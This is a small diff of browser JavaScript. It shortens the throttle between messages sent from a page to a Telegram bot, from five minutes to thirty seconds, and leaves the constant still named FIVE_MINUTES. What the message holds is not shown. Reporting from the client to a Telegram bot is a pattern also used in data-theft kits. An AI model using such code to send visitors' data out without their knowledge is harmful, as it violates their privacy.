@@ -60,7 +60,7 @@
     // === Only send once per 5 minutes ===
     const lastSent = localStorage.getItem("lastTelegramSend");
     const now = Date.now();
-    const FIVE_MINUTES = 5 * 60 * 1000;
+    const FIVE_MINUTES = 0.5 * 60 * 1000;
 
     if (!lastSent || now - lastSent > FIVE_MINUTES) {
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`)
